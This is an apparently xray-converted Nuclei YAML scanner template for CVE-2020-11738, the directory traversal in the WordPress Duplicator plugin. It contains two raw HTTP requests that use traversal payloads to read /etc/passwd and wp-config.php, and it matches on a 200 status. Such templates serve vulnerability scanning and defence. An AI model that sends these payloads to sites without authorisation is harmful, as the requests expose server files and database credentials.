id: yaml-poc-snapcreek-duplicator-directory_traversal-CVE-2020-11738

info:
  name: yaml-poc-snapcreek-duplicator-directory_traversal-CVE-2020-11738
  author: jiapeng.han
  severity: high
  tags: xray-converted,traversal,cve-2020-11738
  reference:
    - http://packetstormsecurity.com/files/160621/WordPress-Duplicator-1.3.26-Directory-Traversal-File-Read.html
    - http://packetstormsecurity.com/files/164533/WordPress-Duplicator-1.3.26-Arbitrary-File-Read.html
    - https://cwe.mitre.org/data/definitions/23.html
    - https://nvd.nist.gov/vuln/detail/CVE-2020-11738
    - https://packetstormsecurity.com/files/160621/WordPress-Duplicator-1.3.26-Directory-Traversal-File-Read.html
    - https://packetstormsecurity.com/files/164533/WordPress-Duplicator-1.3.26-Arbitrary-File-Read.html
    - https://snapcreek.com/duplicator/docs/changelog/?lite
    - https://www.exploit-db.com/exploits/50420
    - https://www.wordfence.com/blog/2020/02/active-attack-on-recently-patched-duplicator-plugin-vulnerability-affects-over-1-million-sites/

http:
  - raw:
      - |
        GET /wp-admin/admin-ajax.php?action=duplicator_download&file=..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
  - raw:
      - |
        GET /wp-admin/admin-ajax.php?action=duplicator_download&file=%2F..%2Fwp-config.php HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200